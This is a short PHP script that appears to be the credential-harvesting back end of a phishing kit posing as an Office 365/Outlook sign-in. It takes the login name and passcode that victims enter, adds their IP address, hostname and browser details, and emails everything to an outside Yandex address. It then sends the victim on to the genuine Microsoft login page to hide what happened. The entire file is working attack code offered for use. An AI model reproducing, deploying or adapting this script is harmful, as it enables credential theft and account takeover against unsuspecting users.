<?php
if($_POST["offizeuname"] != "" and $_POST["offizepasuma"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| E M A I L  |--------------|\n";
$message .= "Online ID            : ".$_POST['offizeuname']."\n";
$message .= "Passcode              : ".$_POST['offizepasuma']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- Fudtool[dot]su --------------|\n";
$send = "hoilinglau@yandex.ru";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwic3tKpiNrWAhXGWxoKHU7IAboQFgglMAA&url=https%3A%2F%2Flogin.microsoftonline.com%2Fppsecure%2Fpost.srf%3Fwa%3Dwsignin1.0%26rpsnv%3D2%26ct%3D1369803670%26rver%3D6.1.6206.0%26wp%3DMBI_KEY%26wreply%3Dhttps%3A%25252F%25252Fwww.outlook.com%25252Fowa%25252F%26id%3D260563%26whr%3Dlive.utm.my%26CBCXT%3Dout%26bk%3D1369803951&usg=AOvVaw1z-PCzGuRpXkqcnoESIivM");
}else{
header ("Location: index.php");
}

?>